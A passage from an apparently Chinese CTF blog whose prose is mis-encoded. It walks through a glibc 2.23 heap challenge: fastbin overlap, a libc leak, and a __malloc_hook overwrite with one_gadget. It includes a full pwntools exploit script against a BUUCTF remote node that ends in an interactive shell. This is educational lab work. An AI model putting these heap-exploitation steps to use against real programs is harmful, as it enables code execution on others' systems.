href="#å…¸å‹çš„å †èœå•é¢˜ç›®ï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œsystemå‡½æ•°ä¹Ÿæ²¡æœ‰" class="headerlink" title="å…¸å‹çš„å †èœå•é¢˜ç›®ï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œsystemå‡½æ•°ä¹Ÿæ²¡æœ‰"></a>å…¸å‹çš„å †èœå•é¢˜ç›®ï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œsystemå‡½æ•°ä¹Ÿæ²¡æœ‰</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134306228.bmp"></p><ul><li><h5 id="addï¼š"><a href="#addï¼š" class="headerlink" title="addï¼š"></a>addï¼š</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134348584.bmp"></p><ul><li><h5 id="editï¼š"><a href="#editï¼š" class="headerlink" title="editï¼š"></a>editï¼š</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134416635.bmp"></p><ul><li><h5 id="deleteï¼š"><a href="#deleteï¼š" class="headerlink" title="deleteï¼š"></a>deleteï¼š</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134451923.bmp"></p><ul><li><h5 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h5></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903134503547.bmp"></p><h3 id="æ€è·¯åˆ†æï¼š"><a href="#æ€è·¯åˆ†æï¼š" class="headerlink" title="æ€è·¯åˆ†æï¼š"></a>æ€è·¯åˆ†æï¼š</h3><ul><li><mark><strong>æ¼æ´ç‚¹åœ¨editå‡½æ•°ï¼Œæœªå¯¹sizeæ£€æŸ¥ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™</strong><mark></mark></mark></li><li>é¢˜ç›®å¼€å¯äº†PIE,unlinkç›´æ¥outï¼Œç”±gotè¡¨ä¸å¯æ”¹ï¼Œæ‰€ä»¥æƒ³åˆ°æ”¹__malloc_hookä¸ºonegadget</li><li>å…ˆé€šè¿‡unsortedbinæ³„éœ²main_arenaï¼Œå³å¯ä»¥å¾—åˆ°malloc_hook(ç›¸å·®0x10), arbitrary_allocé”™ä½æ„é€ fake_chunkï¼Œå°±å¯ä»¥ä¿®æ”¹malloc_hookä¸ºone_gadget</li><li>ä½†æ˜¯è¿ç”¨arbitrary_allocéœ€è¦uafä¿®æ”¹fastbinä¸­chunkçš„fdæŒ‡é’ˆï¼Œå› æ­¤éœ€è¦æˆ‘ä»¬ä¸¤ä¸ªåœ°å€æ§åˆ¶åŒä¸€ä¸ªchunkï¼Œçœ‹ä¸‹é¢è°ƒè¯•å§ã€‚</li></ul><h2 id="gdbè°ƒè¯•ï¼š"><a href="#gdbè°ƒè¯•ï¼š" class="headerlink" title="gdbè°ƒè¯•ï¼š"></a>gdbè°ƒè¯•ï¼š</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc2.24,æ³„æ¼libc,ä¿®æ”¹__malloc_hookä¸ºonegadget</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x00 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x20 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x40 2 </span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0x60 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 0x80 4 </span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fastbins 1-&gt;2</span></span><br></pre></td></tr></table></figure></div><ul><li>æ„é€ äº”ä¸ªchunkï¼Œchunk0ç”¨æ¥æº¢å‡ºchunk1ï¼Œchunk1ï¼Œ2ç”¨äºuafï¼Œchunk4ç”¨æ¥æ³„éœ²libcï¼Œchunk3æº¢å‡ºä¿®æ”¹chunk4</li><li>æŸ¥çœ‹å †å¸ƒå±€ï¼Œçœ‹çœ‹å¦‚ä½•ä½¿å¾—ä¸¤ä¸ªåœ°å€å…±åŒæ§åˆ¶ä¸€ä¸ªchunkï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903162751498.bmp"></p><ul><li>ç”±äºå†…å­˜çš„åˆ†é¡µç®¡ç†æœºåˆ¶ä»¥åŠPIEï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡åˆ†é…å †åœ°å€çš„æœ€åä¸‰ä½åå…­è¿›åˆ¶æ•°è‚¯å®šä¸º000</li><li>æ­¤æ—¶æˆ‘ä»¬æº¢å‡ºchunk0ä¿®æ”¹chunk1çš„fdæŒ‡é’ˆï¼Œä¹Ÿå°±ç›¸å½“äºä¿®æ”¹chunk2çš„åœ°å€ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åˆ©ç”¨chunk4,å¦‚æœå°†1-&gt;fdæ‰€æŒ‡å‘çš„chunk2çš„åœ°å€æœ€åä¸€å­—èŠ‚ä¿®æ”¹ä¸º0x80ï¼Œä¹Ÿå°±æ˜¯1-&gt;fd &#x3D; chunk4ã€‚</li><li>åŒæ—¶ç”±äºaddä¸­ä¼šå¾ªç¯æ£€æŸ¥å“ªä¸ªæŒ‡é’ˆ&#x3D;0å°±å°†mallocçš„åœ°å€ç»™åˆ°è¯¥æŒ‡é’ˆï¼Œè€Œchunk2çš„æŒ‡é’ˆåœ¨freeçš„æ—¶å€™è¢«æ¸…é›¶äº†ï¼Œç¬¬äºŒæ¬¡mallocå°†chunk4ç»™åˆ°äº†chunk2ï¼Œå› æ­¤chunk2ä¼šå’Œchunk4è”ç³»èµ·æ¥ï¼Œå³<strong>ä¿®æ”¹chunk2ä¹Ÿä¼šä¿®æ”¹chunk4</strong>ï¼Œ<strong>ä¹Ÿå°±åšåˆ°äº†uafçš„åˆ©ç”¨</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 1_fd-&gt;4  </span></span><br></pre></td></tr></table></figure></div><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>è™½ç„¶å·²ç»å°†1-&gt;fd -&gt; 4 ,4å’Œ2è”ç³»èµ·æ¥äº†ï¼Œä½†æ˜¯æ­¤æ—¶çš„chunk4æ”¾åœ¨fastbinä¸­è‚¯å®šæ˜¯ä¸åˆé€‚çš„ï¼Œå› ä¸ºsizeä¸åŒï¼Œåœ¨åˆ†é…chunkçš„æ—¶å€™sizeä¸åŒæ˜¯ä¼šæŠ¥é”™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹chunk4çš„sizeï¼Œå’Œchunk1ä¿æŒä¸€è‡´(åœ¨åŒä¸€ä¸ªbinä¸­)</li><li>ç„¶åå°†1ï¼Œ2éƒ½å›æ”¶å›æ¥ï¼Œæ³¨æ„è™½ç„¶1-&gt;fdä¿®æ”¹ä¸ºäº†chunk4,ä½†æ˜¯addçš„å‡½æ•°ä¸­forå¾ªç¯ä»å°åˆ°å¤§ï¼Œåªè¦æ»¡è¶³â€æ ‡å¿—ä½â€æ˜¯0å°±åˆ†é…ï¼Œè€Œchunk2çš„æ ‡å¿—ä½freeä¹‹åå§‹ç»ˆä¸º0ã€‚</li><li>ç„¶åå°†chunk4çš„sizeä¿®æ”¹å›æ¥ï¼Œfree(4)ï¼Œ4çš„fdå’ŒbkæŒ‡é’ˆå°†æŒ‡å‘main_arena+0x58,show(2)å°±å°†è¾“å‡ºè¿™ä¸ªç‰¹æ®Šåœ°å€ï¼Œå› ä¸ºchunk2å’Œchunk4éƒ½æ˜¯æŒ‡å‘chunk4çš„ã€‚</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># ç»•è¿‡fastbinæ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2 å› ä¸º2çš„æŒ‡é’ˆ=0</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 5 é˜²æ­¢å’Œtopchunkåˆå¹¶</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span></span><br><span class="line"><span class="comment"># __malloc_hookå’Œmain_arenaå·®äº†0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook:&quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903165642200.bmp"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>Arbitrary Alloc æ„é€ fake_chunk</li></ul><p>æŠ€å·§å¯ä»¥çœ‹å¼€å¤´çš„æ–‡ç« ï¼Œè¿™é‡Œç›´æ¥æ¼”ç¤ºã€‚</p><ul><li>ä¸ºäº†ä¿®æ”¹malloc_hookä¸ºone_gadgetï¼Œæˆ‘ä»¬è¦å¾€malloc_hookä¸Šé¢æ„é€ fake_chunkï¼Œç„¶åç›´æ¥ä¿®æ”¹å †ä¸­å†…å®¹å³å¯ï¼Œæ¥çœ‹çœ‹malloc_hookä¸Šé¢åˆæ²¡æœ‰åœ°æ–¹æ„é€ å§ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903170254157.bmp"></p><ul><li>æˆ‘ä»¬å‘ç°è¿™ä¸ªåœ°æ–¹å¯ä»¥é”™ä½å‡ºä¸€ä¸ªsizeå‡ºæ¥ï¼Œå¯¹åº”äºfastbin[5]ï¼ˆä¸æ˜¯å¾ˆæ‡‚å¯ä»¥çœ‹å¼€å¤´æ–‡ç« )ï¼Œè¿™ä¸ªé”™ä½å‡ºæ¥çš„chunkçš„sizeæ˜¯0x60(fastbin[5]å¯¹åº”çš„sizeå°±æ˜¯0x60)ï¼Œä¸ºäº†ä½¿fastbinä¸­å·²ç»å­˜åœ¨çš„chunk-&gt;fdé“¾æ¥ä¸Šfake_chunkï¼Œå…¶sizeä¹Ÿåº”è¯¥æ˜¯0x60</li><li>è¯¥chunkçš„åœ°å€å¯ä»¥ä»å›¾ä¸Šçœ‹å‡ºï¼šmalloc_hook-0x13-0x8(size)-0x8(prev_size)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.23-0ubuntu11.2_amd64.so&quot;</span>)</span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># æ„é€ ä¸€ä¸ªä½äºfastbinçš„chunk</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">payload = p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># ä¿®æ”¹chunk2=ä¿®æ”¹chunk4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6 -&gt; fake_chunk</span></span><br></pre></td></tr></table></figure></div><ul><li>ä¸‹å›¾å¯ä»¥å‘ç°ä¿®æ”¹chunk2å…¶å®ä¹Ÿä¿®æ”¹äº†chunk4</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240903171316211.bmp"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><ul><li>ç„¶åå°±å¾ˆç®€å•äº†ï¼Œä¿®æ”¹malloc_hook-&gt;one_gadgetï¼Œå†æ¬¡mallocå³å¯ã€‚</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x13</span>) + p64(onegadget) <span class="comment"># ä»ä¸Šå›¾çœ‹åç§»å³å¯</span></span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>è¡¥å……ï¼šè¦æ˜¯ç”¨çš„buuctfç»™çš„libc-2.23.soçš„è¯ï¼Œå³ä½¿è¯•ä¾¿æ‰€æœ‰çš„onegadgetä¹Ÿæ˜¯ä¸å¯ä»¥æ‰“é€šçš„ï¼Œå› ä¸ºæ ˆä¸Šçš„æ•°æ®ä¸æ»¡è¶³ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ”¹__realloc_hookä¸ºonegadgetï¼Œç„¶åä¿®æ”¹malloc_hookä¸ºrealloc+n(nè¦è‡ªå·±è¯•)</li><li>å› ä¸ºè¿™ä¸ªreallocé™„è¿‘å­˜åœ¨å¤§é‡çš„gadgetå¯ä»¥è°ƒæ•´æ ˆç»“æ„ï¼Œä¸‹é¢æ˜¯è„šæœ¬(ä¸ä¸Šé¢ä¸åŒï¼Œè¿™æ˜¯åé¢é‡æ–°å†™çš„):</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot;</span></span><br><span class="line"><span class="comment">#libc = &#x27;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25292</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,content=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># overlapping</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 4</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload) <span class="comment"># ä½¿å¾—chunk4è¿›å…¥fastbinä¸­</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) </span><br><span class="line">fill(<span class="number">3</span>,payload) <span class="comment"># ç»•è¿‡æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 4-2 å› ä¸ºfreeå°†2å·chunkçš„æŒ‡é’ˆè®°ä¸º0,ä½†æ­¤æ—¶fastbinä¸­çš„æ˜¯chunk4ï¼Œå°±å°†</span></span><br><span class="line"><span class="comment"># chunk4ç»™äº†2å·ï¼Œæ‰€ä»¥æ­¤æ—¶2å·å’Œ4å·éƒ½æŒ‡å‘4å·chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹chunk4_sizeï¼Œleak libc</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment"># 5 é˜²æ­¢å’Œtop chunkåˆå¹¶</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">main_arena = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">lg(<span class="string">&quot;main_arena: &quot;</span>,main_arena)</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x58</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># 0x736c49fc4b10</span></span><br><span class="line">realloc = libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># è¿›å…¥fastbin</span></span><br><span class="line"></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span> <span class="comment"># Arbitary alloc</span></span><br><span class="line">fill(<span class="number">2</span>,p64(fake_chunk)) <span class="comment"># fastbiné“¾æ¥fake chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#6 fake_chunk</span></span><br><span class="line">onegadget = libc.address + one[<span class="number">1</span>]</span><br><span class="line">payload = cyclic(<span class="number">0xb</span>)+p64(onegadget) + p64(realloc+<span class="number">10</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h2><ul><li><p>ä¹‹å‰æœ‰å‡ æ¬¡å‡ºç°äº†â€œtimeout: the monitored command dumped coreâ€</p></li><li><p>å¯ä»¥çœ‹çœ‹<a class="link" href="https://blog.csdn.net/Lcw_linyx/article/details/124311578">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>å…¶å®è¿˜æœ‰ä¸€ç§æƒ…å†µ(æˆ‘ä¹Ÿä¸çŸ¥é“ç®—ä¸ç®—)ï¼Œæˆ‘ä¿®æ”¹äº†libc.soæ–‡ä»¶å°±è¿‡äº†</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_n_3-uaf</title>
      <link href="/2024/09/02/ciscn-2019-n-3-uaf/"/>
      <url>/2024/09/02/ciscn-2019-n-3-uaf/</url>
      
